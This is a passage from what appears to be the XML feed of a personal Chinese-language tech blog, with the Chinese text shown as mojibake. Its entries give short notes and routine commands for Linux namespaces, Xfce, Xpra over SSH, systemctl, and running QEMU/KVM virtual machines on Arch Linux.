    <content type="html"><![CDATA[<p><a href="https://coolshell.cn/articles/17010.html">å‚è€ƒ1</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Linux Namespace æ˜¯ Linux æä¾›çš„ä¸€ç§å†…æ ¸çº§åˆ«ç¯å¢ƒéš”ç¦»çš„æ–¹æ³•.</p><p>Unix çš„ chroot ç³»ç»Ÿè°ƒç”¨, é€šè¿‡ä¿®æ”¹æ ¹ç›®å½•åˆ°ä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸‹, æä¾›ä¸€ç§ç®€å•çš„éš”ç¦»æ¨¡å¼: chroot å†…éƒ¨çš„æ–‡ä»¶ç³»ç»Ÿæ— æ³•è®¿é—®å¤–éƒ¨çš„å†…å®¹. </p><p><a href="https://lwn.net/Articles/531114/">Linux Namespace å®˜æ–¹æ–‡æ¡£</a></p><p>ä¸»è¦æ˜¯ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨:</p><ul><li><code>clone()</code></li><li><code>unshare()</code></li><li><code>setns()</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-å…³äº-Xfce-éƒ¨åˆ†</title>
    <link href="/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xfce-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xfce-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Xfce">ArchWiki</a><br>Xfce æ˜¯ä¸€ä¸ªåŸºäº GTK 3 çš„è½»é‡çº§æ¨¡å—åŒ–çš„æ¡Œé¢ç¯å¢ƒ.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®‰è£… xfce4 åŒ…ç»„, Xfce é»˜è®¤ä½¿ç”¨ Xfwm ä½œä¸ºçª—å£ç®¡ç†å™¨.</p><h1 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h1><p>æ·»åŠ : <code>exec startxfce4</code> åˆ° Xinitrc ä¸­.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-å…³äº-Xpra-éƒ¨åˆ†</title>
    <link href="/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xpra-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xpra-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒArchWiki"><a href="#å‚è€ƒArchWiki" class="headerlink" title="å‚è€ƒArchWiki"></a>å‚è€ƒ<a href="https://wiki.archlinux.org/title/Xpra">ArchWiki</a></h1><p>Xpra æ˜¯ â€˜GNU Screen for Xâ€™.</p><h2 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1 å®‰è£…"></a>1 å®‰è£…</h2><p>ç›´æ¥å®‰è£… <code>xpra</code> åŒ…æˆ– <code>xpra-git</code> åŒ…åœ¨ server å’Œ clinets.</p><h2 id="2-ä½¿ç”¨"><a href="#2-ä½¿ç”¨" class="headerlink" title="2 ä½¿ç”¨"></a>2 ä½¿ç”¨</h2><p>ä½¿ç”¨åœ¨ SSH ä¹‹ä¸Š:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start ssh:user@host --exit-with-children --start-child=<span class="hljs-string">&quot;command&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª command å°±æ˜¯ä½ æƒ³è®©è¿œç«¯æ‰“å¼€çš„ä»»åŠ¡.</p><p>å¦ä¸€ç§æ“ä½œè§ wiki.</p><p>åªæœ‰ <code>attach</code> ä¹‹åç”»é¢æ‰ä¼šæ˜¾ç¤ºåœ¨ local screen.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach ssh:user@example.com:7<br></code></pre></td></tr></table></figure><p>è‹¥è¿æ¥æœ¬æœºä¸Šé¢çš„:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach :7<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>detach</code> æˆ– <code>Ctrl+c</code> detach, åœ¨ detach ä¹‹å, è¿œç«¯çš„ç¨‹åºä¼šç»§ç»­è¿è¡Œ.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra detach ssh:user@example.com:7<br></code></pre></td></tr></table></figure><h3 id="å¯ç”¨-whole-desktop-environment"><a href="#å¯ç”¨-whole-desktop-environment" class="headerlink" title="å¯ç”¨ whole desktop environment"></a>å¯ç”¨ whole desktop environment</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start-desktop :7 --start-child=xfce4-session --exit-with-children<br></code></pre></td></tr></table></figure><ul><li><code>:7</code> æŒ‡çš„æ˜¯ xorg DISPLAY session çš„å·ç </li><li><code>--start-child=xfce4-session</code> æ˜¯è¿è¡Œ xfce4 session ä½œä¸º xpra server çš„å­è¿›ç¨‹</li><li><code>--exit-with-children</code> è¡¨ç¤ºå½“ child exit æ—¶ server å°†è¢«å…³é—­</li></ul><h1 id="å‚è€ƒ-è®ºå›"><a href="#å‚è€ƒ-è®ºå›" class="headerlink" title="å‚è€ƒ è®ºå›"></a>å‚è€ƒ <a href="https://unix.stackexchange.com/questions/10597/reattach-to-lost-x11-session/10598#10598">è®ºå›</a></h1><p>æ‰“å¼€ remote machine:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start :13<br></code></pre></td></tr></table></figure><p>attach åˆ°è¿œç«¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach ssh:remote:13<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºç”»é¢:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ DISPLAY=:13 xeyes<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºç½‘ç»œæå…¶ä¸ç¨³å®š-åœ¨-arch</title>
    <link href="/2022/10/01/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E6%9E%81%E5%85%B6%E4%B8%8D%E7%A8%B3%E5%AE%9A-%E5%9C%A8-arch/"/>
    <url>/2022/10/01/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E6%9E%81%E5%85%B6%E4%B8%8D%E7%A8%B3%E5%AE%9A-%E5%9C%A8-arch/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://www.linuxquestions.org/questions/linux-networking-3/unstable-wifi-conection-after-base-arch-install-4175709800/">å‚è€ƒ1</a></h1><p>ä¼¼ä¹æ˜¯å†…æ ¸çš„é—®é¢˜:<br><img src="/../img/maybe_useful.png" alt="å¯èƒ½çš„è§£å†³åŠæ³•"></p><p>ä¹Ÿå¯èƒ½æ˜¯å¤šä¸ªç½‘ç»œç®¡ç†æœåŠ¡çš„å†²çªé—®é¢˜:<br><img src="/../img/conflict.png" alt="conflict"></p><h1 id="ä¼¼ä¹è§£å†³äº†"><a href="#ä¼¼ä¹è§£å†³äº†" class="headerlink" title="ä¼¼ä¹è§£å†³äº†"></a>ä¼¼ä¹è§£å†³äº†</h1><p>å°† <code>NetworkManager</code> ç›¸å…³çš„æœåŠ¡ <code>disable</code> å, ç¡®å®æ²¡æœ‰æ–­å¼€.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-å…³äº-systemctl-éƒ¨åˆ†</title>
    <link href="/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-systemd-%E7%9A%84%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-systemd-%E7%9A%84%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Systemd">ArchWiki</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>systemd æ˜¯ä¸€ä¸ª Linux ç³»ç»ŸåŸºç¡€ç»„ä»¶çš„é›†åˆ, æä¾›äº†ä¸€ä¸ªç³»ç»Ÿå’ŒæœåŠ¡ç®¡ç†å™¨, è¿è¡Œä¸º PID 1 å¹¶è´Ÿè´£å¯åŠ¨å…¶ä»–ç¨‹åº.</p><h1 id="1-systemctl-åŸºæœ¬ç”¨æ³•"><a href="#1-systemctl-åŸºæœ¬ç”¨æ³•" class="headerlink" title="1 systemctl åŸºæœ¬ç”¨æ³•"></a>1 systemctl åŸºæœ¬ç”¨æ³•</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl -H ç”¨æˆ·å@ä¸»æœºå<br></code></pre></td></tr></table></figure><p>å¯ç”¨æ¥è¿œç¨‹æ§åˆ¶å…¶ä»–æœºå™¨.</p><h2 id="1-1-ä½¿ç”¨å•å…ƒ"><a href="#1-1-ä½¿ç”¨å•å…ƒ" class="headerlink" title="1.1 ä½¿ç”¨å•å…ƒ"></a>1.1 ä½¿ç”¨å•å…ƒ</h2><p>é€šå¸¸åŒ…æ‹¬: </p><ul><li>æœåŠ¡ (.service)</li><li>æŒ‚è½½ç‚¹ (.mount)</li><li>è®¾å¤‡ (.device)</li><li>å¥—æ¥å­— (.socket)</li></ul><p>ä¸€èˆ¬ä½¿ç”¨å•å…ƒæ–‡ä»¶çš„å…¨å:</p><ul><li>æ— æ‰©å±•å, é»˜è®¤ä¸º <code>.service</code></li><li>æŒ‚è½½ç‚¹è‡ªåŠ¨è½¬åŒ–ä¸ºç›¸åº”çš„ <code>.mount å•å…ƒ</code>, <code>/home</code> ç­‰ä»·äº <code>home.mount</code></li><li>ä¸æŒ‚è½½ç‚¹ç±»ä¼¼, è®¾å¤‡ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºç›¸åº”çš„ <code>.device</code> å•å…ƒ, <code>/dev/sda2</code> ç­‰ä»·äº <code>dev-sda2.device</code></li></ul><h1 id="2-ç¼–å†™å•å…ƒæ–‡ä»¶"><a href="#2-ç¼–å†™å•å…ƒæ–‡ä»¶" class="headerlink" title="2 ç¼–å†™å•å…ƒæ–‡ä»¶"></a>2 ç¼–å†™å•å…ƒæ–‡ä»¶</h1><p>å¯æŸ¥çœ‹ <code>man systemd.service</code><br>è¯­æ³•æ¥æºäº XDG æ¡Œé¢é…ç½®æ–‡ä»¶ <code>.desktop</code>.</p><ul><li><code>/usr/lib/systemd/system/</code> æ˜¯è½¯ä»¶åŒ…å®‰è£…çš„å•å…ƒ</li><li><code>/etc/systemd/system/</code> æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…çš„å•å…ƒ</li></ul><h1 id="3-ç›®æ ‡-target"><a href="#3-ç›®æ ‡-target" class="headerlink" title="3 ç›®æ ‡ (target)"></a>3 ç›®æ ‡ (target)</h1><p>æ˜¯ä¸€ä¸ªå’Œè¿è¡Œçº§åˆ« (runlevel) åŠŸèƒ½ç›¸ä¼¼åˆä¸åŒçš„æ¦‚å¿µ.</p><h1 id="6-æŒ‚è½½"><a href="#6-æŒ‚è½½" class="headerlink" title="6 æŒ‚è½½"></a>6 æŒ‚è½½</h1><p>systemd ä¹Ÿè´Ÿè´£æŒ‰ <code>/etc/fstab</code> æŒ‚åœ¨ç›®å½•.</p><h1 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h1><h2 id="åˆ—å‡ºæ‰€æœ‰çŠ¶æ€ä¸º-enable-çš„æœåŠ¡"><a href="#åˆ—å‡ºæ‰€æœ‰çŠ¶æ€ä¸º-enable-çš„æœåŠ¡" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰çŠ¶æ€ä¸º enable çš„æœåŠ¡"></a>åˆ—å‡ºæ‰€æœ‰çŠ¶æ€ä¸º enable çš„æœåŠ¡</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl list-unit-files --state=enabled<br></code></pre></td></tr></table></figure><h2 id="æŒ‰ä¼˜å…ˆçº§ä»ä½åˆ°é«˜æ˜¾ç¤ºåŠ è½½ç›®å½•"><a href="#æŒ‰ä¼˜å…ˆçº§ä»ä½åˆ°é«˜æ˜¾ç¤ºåŠ è½½ç›®å½•" class="headerlink" title="æŒ‰ä¼˜å…ˆçº§ä»ä½åˆ°é«˜æ˜¾ç¤ºåŠ è½½ç›®å½•"></a>æŒ‰ä¼˜å…ˆçº§ä»ä½åˆ°é«˜æ˜¾ç¤ºåŠ è½½ç›®å½•</h2><p>ä¹Ÿå°±æ˜¯ä»å“ªé‡Œè¯»å–å•å…ƒæ–‡ä»¶.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl show --property=UnitPath<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>äº†è§£-QEMU-æ¨¡æ‹Ÿå™¨ä»¥åŠå…¶å’Œ-KVM-çš„å…³ç³»</title>
    <link href="/2022/10/01/%E4%BA%86%E8%A7%A3-QEMU-%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%92%8C-KVM-%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2022/10/01/%E4%BA%86%E8%A7%A3-QEMU-%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%92%8C-KVM-%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>QEMU æ˜¯ quick emulator çš„ç®€ç§°.</p><p>KVM æ˜¯ Kernel base Virtual Machina çš„ç®€ç§°.</p><p>KVM å¯ä»¥çœ‹ä½œæ˜¯ QEMU çš„åŠ é€Ÿå™¨, åˆ©ç”¨çœŸå®ç¡¬ä»¶çš„æ€§èƒ½æ¥æé«˜æ¨¡æ‹Ÿè½¯ä»¶çš„æ€§èƒ½. å…¶è¿æ¥äº†è™šæ‹Ÿæœºå’Œç‰©ç†ç¡¬ä»¶.</p><p>KVM æ˜¯åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœº, æ˜¯å†…ç½®äº Linux å†…æ ¸çš„ hypervisor.</p><p>KVM æ˜¯ QEMU çš„ä¸€ç§ç‰¹æ®Šçš„è¿è¡Œæ¨¡å¼, è¿™ç§æ¨¡å¼é€šè¿‡å†…æ ¸æ¨¡å—ä½¿ç”¨ CPU æ‰©å±•è¿›è¡Œè™šæ‹ŸåŒ–.</p><p>KVM æ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†.</p><h1 id="æ›´å¤šå…³äº-QEMU-æ¨¡æ‹Ÿå™¨åŠå…¶åº•å±‚"><a href="#æ›´å¤šå…³äº-QEMU-æ¨¡æ‹Ÿå™¨åŠå…¶åº•å±‚" class="headerlink" title="æ›´å¤šå…³äº QEMU æ¨¡æ‹Ÿå™¨åŠå…¶åº•å±‚"></a>æ›´å¤šå…³äº QEMU æ¨¡æ‹Ÿå™¨åŠå…¶åº•å±‚</h1><p><a href="https://zhuanlan.zhihu.com/p/72484589?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1587203917187817472&utm_source=qq">å‚è€ƒ çŸ¥ä¹</a></p><p>QEMU æ˜¯çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–æ¨¡æ‹Ÿå™¨, å‡ ä¹å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ç¡¬ä»¶è®¾å¤‡.</p><p>æ­£å› ä¸º QEMU æ˜¯çº¯è½¯ä»¶å®ç°çš„, æ‰€æœ‰çš„æŒ‡ä»¤éƒ½è¦ç» QEMU è¿‡ä¸€æ‰‹, æ€§èƒ½éå¸¸ä½, æ‰€ä»¥, åœ¨ç”Ÿäº§ç¯å¢ƒä¸­, å¤§å¤šæ•°çš„åšæ³•éƒ½æ˜¯é…åˆ KVM æ¥å®Œæˆè™šæ‹ŸåŒ–å·¥ä½œ.</p><p>kvm è´Ÿè´£ cpu è™šæ‹ŸåŒ– + å†…å­˜è™šæ‹ŸåŒ–, å®ç°äº† cpu å’Œå†…å­˜çš„è™šæ‹ŸåŒ–, ä½† kvm ä¸èƒ½æ¨¡æ‹Ÿå…¶ä»–è®¾å¤‡. qemu æ¥æ¨¡æ‹Ÿ IO è®¾å¤‡ (å¦‚ç½‘å¡, ç£ç›˜, qemu å½“ç„¶ä¹Ÿå¯ä»¥æ¨¡æ‹Ÿ cpu, å†…å­˜, ä½†æ˜¯æ¯”è¾ƒä½æ•ˆ), kvm åŠ ä¸Š qemu ä¹‹åå°±èƒ½å®ç°çœŸæ­£æ„ä¹‰ä¸ŠæœåŠ¡å™¨è™šæ‹ŸåŒ–. å› ä¸ºç”¨åˆ°äº†ä¸Šé¢ä¸¤ä¸ªè½¯ä»¶, æ‰€ä»¥ä¸€èˆ¬éƒ½ç§°ä¹‹ä¸º qemu-kvm. libvirt åˆ™æ˜¯è°ƒç”¨ kvm è™šæ‹ŸåŒ–æŠ€æœ¯çš„æ¥å£ç”¨äºç®¡ç†çš„, ç”¨ libvirt ç®¡ç†æ–¹ä¾¿, ç›´æ¥ç”¨ qemu-kvm çš„æ¥å£å¤ªç¹çã€‚</p><p>æ€»ä½“ç»“æ„å›¾:</p><p><img src="/../img/whole_structure_of_qemu.png"></p><p>å‡ ä¸ªå®‰è£… qemu åçš„å‘½ä»¤:</p><p><img src="/../img/the_tools_of_qemu.png"></p><p>å…ˆåˆ›å»ºè™šæ‹Ÿæœºé•œåƒ, ä¹Ÿå°±æ˜¯ç”¨æ¥æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„ç¡¬ç›˜, å¯åŠ¨è™šæ‹Ÿæœºä¹Ÿå°±æ˜¯ qemu åœ¨è¿™ä¸ªç¡¬ç›˜ä¸Šè¿›è¡Œæ¨¡æ‹Ÿ.</p><p><code>qcow2</code> æ˜¯ QEMU æœ€å¸¸ç”¨çš„é•œåƒæ ¼å¼, é‡‡ç”¨å†™æ—¶å¤åˆ¶æŠ€æœ¯æ¥ä¼˜åŒ–æ€§èƒ½.</p><p>åœ¨å¯åŠ¨ä¸€ä¸ªè™šæ‹Ÿæœºæ—¶ï¼Œéœ€è¦å…ˆåœ¨ç¡¬ç›˜ (ä¹Ÿå°±æ˜¯è¿™ä¸ªè™šæ‹Ÿæœºé•œåƒ) ä¸­å®‰è£…ä¸€ä¸ªç³»ç»Ÿ.</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>åˆ›å»ºè™šæ‹Ÿæœºç¡¬ç›˜:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-img create -f qcow2 test.qcow2 10G<br></code></pre></td></tr></table></figure><p>å®‰è£…æ“ä½œç³»ç»Ÿ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -m 2048 -enable-kvm test.qcow2 -cdrom ubuntu.iso<br></code></pre></td></tr></table></figure><p>å¯åŠ¨è™šæ‹Ÿæœº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -m 2048 -enable-kvm test.qcow2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-kvm-å†…æ ¸æ¨¡å—ç¼ºå°‘-virtio-serial</title>
    <link href="/2022/10/01/%E5%85%B3%E4%BA%8E-kvm-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%BA%E5%B0%91-virtio-serial/"/>
    <url>/2022/10/01/%E5%85%B3%E4%BA%8E-kvm-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%BA%E5%B0%91-virtio-serial/</url>
    
    <content type="html"><![CDATA[<p>ä¼¼ä¹èƒ½æ­£å¸¸è¿è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux-ä¸­ä½¿ç”¨-kvm-è™šæ‹Ÿæœº</title>
    <link href="/2022/10/01/Archlinux-%E4%B8%AD%E4%BD%BF%E7%94%A8-kvm-%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2022/10/01/Archlinux-%E4%B8%AD%E4%BD%BF%E7%94%A8-kvm-%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦æ£€æŸ¥å„ç§æ”¯æŒ, ç„¶ååŠ è½½æ²¡æœ‰åŠ è½½çš„æ¨¡å—, å®‰è£… qemu, å‡†å¤‡ä¸€ä¸ªé•œåƒç›˜, ä¹‹åå°±å¯ä»¥ä½¿ç”¨.</p><h2 id="åˆ›å»ºç¡¬ç›˜é•œåƒ"><a href="#åˆ›å»ºç¡¬ç›˜é•œåƒ" class="headerlink" title="åˆ›å»ºç¡¬ç›˜é•œåƒ"></a>åˆ›å»ºç¡¬ç›˜é•œåƒ</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> qemu<span class="hljs-literal">-img</span> create <span class="hljs-operator">-f</span> qcow2 archlinux.qcow2 <span class="hljs-number">40</span>G<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¸œè¥¿å°±ç›¸å½“ä¸æ˜¯ä¸€ä¸ªç¡¬ç›˜, æˆ–ä¸€ä¸ªåˆ†åŒº. åå­—æ— æ‰€è°“, ä½†åº”è¯¥è¦ç”¨ <code>.qcow2</code> ä½œä¸ºåç¼€.</p><h2 id="å®‰è£…æ“ä½œç³»ç»Ÿ"><a href="#å®‰è£…æ“ä½œç³»ç»Ÿ" class="headerlink" title="å®‰è£…æ“ä½œç³»ç»Ÿ"></a>å®‰è£…æ“ä½œç³»ç»Ÿ</h2><p>å‰é¢åˆ¶ä½œçš„æ˜¯ç¡¬ç›˜. è¿™é‡Œå…¶å®å°±æ˜¯ç”¨å¯åŠ¨ç›˜ (<code>.iso</code>) æ–‡ä»¶, æ¥å¯åŠ¨å¹¶å®‰è£…, ç›¸å½“äºè£…ç³»ç»Ÿçš„æ—¶å€™ USB å¯åŠ¨.</p><p>ä½¿ç”¨æ— ç•Œé¢ (headless) æ¨¡å¼æ—¶, å°†ä¼šé»˜è®¤åœ¨æœ¬åœ° 5900 ç«¯å£å¯åŠ¨ä¸€ä¸ª VNC æœåŠ¡å™¨, å¯ä»¥ç”¨ TigerVNC è¿æ¥åˆ°å®¢æˆ·æœºçš„ç³»ç»Ÿä¸Š: <code>vncviewer :5900</code>.</p><h2 id="è¿è¡Œè™šæ‹ŸåŒ–çš„ç³»ç»Ÿ"><a href="#è¿è¡Œè™šæ‹ŸåŒ–çš„ç³»ç»Ÿ" class="headerlink" title="è¿è¡Œè™šæ‹ŸåŒ–çš„ç³»ç»Ÿ"></a>è¿è¡Œè™šæ‹ŸåŒ–çš„ç³»ç»Ÿ</h2><p>æ ¹æ®å®¢æˆ·æœºçš„æ¶æ„, ä½¿ç”¨ <code>qemu-system-*</code> ç¨‹åº, å¦‚ <code>qemu-system-x86_64</code>.</p><p>è¿™ä¸ªæ˜¯å¯åŠ¨çš„å‘½ä»¤, åé¢è·Ÿå¦‚ <code>archlinux.qcow2</code>. å°±åŒé€‰æ‹©ä¸€ä¸ªç¡¬ç›˜æ¥å¯åŠ¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 archlinux.qcow2<br></code></pre></td></tr></table></figure><h2 id="å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºæ•°æ®äº¤äº’"><a href="#å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºæ•°æ®äº¤äº’" class="headerlink" title="å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºæ•°æ®äº¤äº’"></a>å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºæ•°æ®äº¤äº’</h2><p>é»˜è®¤æƒ…å†µä¸‹, ç”¨æˆ·æ¨¡å¼çš„å®¢æˆ·æœºèƒ½å¤Ÿé€šè¿‡ <code>10.0.2.2</code> è¿™ä¸ª IP è®¿é—®åˆ°å®¿ä¸»æœº. ä»»ä½•è¿è¡Œäºå®¿ä¸»æœºä¸Šçš„æœåŠ¡ç«¯ç¨‹åºéƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€è¢«è®¿é—®åˆ°.</p><h2 id="QEMU-ç«¯å£è½¬å‘"><a href="#QEMU-ç«¯å£è½¬å‘" class="headerlink" title="QEMU ç«¯å£è½¬å‘"></a>QEMU ç«¯å£è½¬å‘</h2><p>QEMU èƒ½å¤Ÿå°†å®¿ä¸»æœºçš„ç«¯å£è½¬å‘åˆ°å®¢æˆ·æœºä¸Š.</p><p>å°±åƒç«¯å£ç»‘å®š, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 disk_image -nic user,hostfwd=tcp::10022-:22<br></code></pre></td></tr></table></figure><h2 id="æŒ‚è½½-qcow2-é•œåƒå†…çš„åˆ†åŒº"><a href="#æŒ‚è½½-qcow2-é•œåƒå†…çš„åˆ†åŒº" class="headerlink" title="æŒ‚è½½ qcow2 é•œåƒå†…çš„åˆ†åŒº"></a>æŒ‚è½½ qcow2 é•œåƒå†…çš„åˆ†åŒº</h2><h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>ç”¨ <code>-vnc :x</code> é€‰é¡¹.</p><p>åŸºæœ¬çš„å£ä»¤éªŒè¯, ä½¿ç”¨ <code>password</code>é€‰é¡¹è®¾ç½®è®¿é—®å£ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -vnc :0,password -monitor stdio<br></code></pre></td></tr></table></figure><p>å£ä»¤è¢«é™åˆ¶åœ¨ 8 ä¸ªå­—ç¬¦å†….</p><h2 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h2><p>é€šè¿‡ <code>-cpu host</code> é€‰é¡¹è®© QEMU æ¨¡æ‹Ÿå®¿ä¸»æœºä¸Šçš„ç‰¹å®š CPU.</p><p>å¦‚æœå®¿ä¸»æœºæœ‰å¤šä¸ªæ ¸å¿ƒ, å¯ä»¥ç”¨ <code>-smp</code> ä¸ºå®¢æˆ·æœºåˆ†é…æ›´å¤šæ ¸å¿ƒ.</p><p>é»˜è®¤æƒ…å†µä¸‹, QEMU ä»…ä»…ä¸ºæ¯å°è™šæ‹Ÿæœºåˆ†é… 128MB å†…å­˜, å¯ä»¥ä½¿ç”¨ <code>-m</code> é€‰é¡¹åˆ†é…æ›´å¤šå†…å­˜.</p><h2 id="æ±‡æ€»å‘½ä»¤"><a href="#æ±‡æ€»å‘½ä»¤" class="headerlink" title="æ±‡æ€»å‘½ä»¤"></a>æ±‡æ€»å‘½ä»¤</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -drive file=xxx.qcow2 -cdrom iso_image -boot menu=on -enable-kvm -vnc :x,password -monitor stdio -m 10G<br></code></pre></td></tr></table></figure><p><code>-drive file=</code> ç”¨æ¥æŒ‡å®šç¡¬ç›˜, è¿™é‡Œæ˜¯å¦‚ <code>archlinux.qcow2</code>.</p><p><code>-cdrom </code> è¿™é‡Œæ˜¯æŒ‡å®šå¯åŠ¨å…‰ç›˜, å°±æ˜¯ <code>.iso</code> æ–‡ä»¶.</p><p>æŒ‡å®š <code>-boot menu=on</code> å¯å¯ç”¨ boot èœå•.</p><p><code>-boot</code> é€‰é¡¹æŒ‡å®šå¯åŠ¨é¡ºåº, æœ‰ä¸‰ç§:</p><ul><li><code>a</code>, ä»è½¯ç›˜å¯åŠ¨</li><li><code>c</code>, 